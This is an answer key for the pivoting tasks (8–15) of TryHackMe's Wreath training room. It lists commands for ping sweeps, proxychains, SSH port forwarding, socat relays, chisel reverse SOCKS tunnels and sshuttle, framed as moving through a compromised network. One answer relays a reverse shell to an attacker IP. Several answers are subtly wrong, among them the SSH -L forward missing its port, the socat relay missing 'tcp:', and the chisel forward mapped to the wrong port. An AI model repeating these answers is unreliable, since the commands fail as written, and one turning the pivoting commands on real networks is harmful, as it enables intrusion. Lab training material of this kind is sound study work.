# TryHackMe [Wreath](https://www.tryhackme.com/room/wreath) Task 8-15
### References
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 8: Pivoting - High-level Overview [YouTube Video]. In YouTube. https://youtu.be/xv9bCJLv-DU
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 9: Pivoting - Enumeration [YouTube Video]. In YouTube. https://youtu.be/lmMqlt5R38Y
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 10: `proxychains` and FoxyProxy [YouTube Video]. In YouTube. https://youtu.be/vqLbUWpp1Hs
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 11: Pivoting - SSH Tunneling and Port Forwarding [YouTube Video]. In YouTube. https://youtu.be/CiW2zPPwfiQ
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 12: Pivoting - `plink.exe` [YouTube Video]. In YouTube. https://youtu.be/MSxRNTU4bUQ
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 13: Pivoting - `socat` [YouTube Video]. In YouTube. https://youtu.be/ydmlsRCQiIE
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 14: Pivoting - `chisel` [YouTube Video]. In YouTube. https://youtu.be/6lG2JnmxI_g
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 15: Pivoting - sshuttle [YouTube Video]. In YouTube. https://youtu.be/1hkXgz-qttY
## Task 8: High-level Overview
### Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?
**Answer**: `Tunnelling`
### Which Metasploit Framework Meterpreter command can be used to create a port forward?
**Answer**: `portfwd`
## Task 9: Enumeration
### What is the absolute path to the file containing DNS entries on Linux?
**Answer**: `/etc/resolv.conf`
### What is the absolute path to the hosts file on Windows?
**Answer**: `C:\Windows\System32\drivers\etc\hosts`
### How could you see which IP addresses are active and allow ICMP `echo` requests on the `172.16.0.x/24` network using `bash`?
**Answer**: `for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done`
## Task 10: `proxychains` & FoxyProxy
## What line would you put in your `proxychains` config file to redirect through a socks4 proxy on `127.0.0.1:4242`?
**Answer**: `socks4 127.0.0.1:4242`
### What command would you use to `telnet` through a proxy to `172.16.0.100:23`?
**Answer**: `proxychains telnet 172.16.0.100:23`
### Which tool is more apt for proxying to a webapp: `proxychains` (PC) or FoxyProxy (FP)?
**Answer**: `FP`
## Task 11: SSH Tunnelling/Port Forwarding
### If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?
**Answer**: `L`
### Which switch combination can be used to background an SSH port forward or tunnel?
**Answer**: `-fN`
### It's a good idea to enter our own password on the remote machine to set up a reverse proxy (Aye or Nay)?
**Answer**: `Nay`
### What command would you use to create a pair of throwaway SSH keys for a reverse connection?
**Answer**: `ssh-keygen`
### If you wanted to set up a reverse port forward from port 22 of a remote machine (`172.16.0.100`) to port 2222 of your local machine (`172.16.0.200`), using a key file called `id_rsa` and backgrounding the shell, what command would you use?
**Answer**: `ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN`
### What command would you use to set up a forward proxy on port 8000 to `user@target.thm`, backgrounding the shell?
**Answer**: `ssh -D 8000 user@target.thm -fN`
### If you had SSH access to a server (`172.16.0.50`) with a webserver running internally on port 80 (only accessible to the server itself on `127.0.0.1:80`), how would you forward it to port 8000 on your attacking machine?
**Answer**: `ssh -L 8000:127.0.0.1 user@172.16.0.50 -fN`
## Task 12: `plink.exe`
### What tool can be used to convert OpenSSH keys into PuTTY style keys?
**Answer**: `puttygen`
## Task 13: `socat`
### Which `socat` option allows you to reuse the same listening port for more than one connection?
**Answer**: `reuseaddr`
### If your Attacking IP is `172.16.0.200`, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of `socat` in the current directory?
**Answer**: `./socat tcp-l:8000 172.16.0.200:443`
### What command would you use to forward TCP port 2222 on a compromised server, to` 172.16.0.100:22`, using a static copy of `socat` in the current directory, and backgrounding the process (easy method)?
**Answer**: `./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &`
## Task 14: `chisel`
### What command would you use to start a chisel server for a reverse connection on your attacking machine?
**Answer**: `./chisel server 4242 --reverse`
### What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is `172.16.0.200` and backgrounding the process?
**Answer**: `./chisel client 172.16.0.200:4242 R:socks &`
### How would you forward `172.16.0.100:3306` to your own port 33060 using a chisel remote port forward, assuming your own IP is `172.16.0.200` and the listening port is 1337?
**Answer**: `./chisel client 172.16.0.200:1337 R:3306:172.16.0.100:3306 &`
### If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local port forward, opening port 8000 locally and linking to `172.16.0.10:80`?
**Answer**: `./chisel client 172.16.0.5:4444 8000:172.16.0.10:80`
## `sshuttle`
### How would you use sshuttle to connect to `172.16.20.7`, with a username of `"pwned"` and a subnet of `172.16.0.0/16`?
**Answer**: `sshuttle -r pwned@172.16.20.7 172.16.0.0/16`
### What switch (and argument) would you use to tell sshuttle to use a key file called `"priv_key"` located in the current directory?
**Answer**: `--ssh-cmd "ssh -i priv_key"`
### You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addresses, but you are getting a Broken Pipe error. What switch (and argument) could you use to fix this error?
**Answer**: `-x 172.16.0.100`
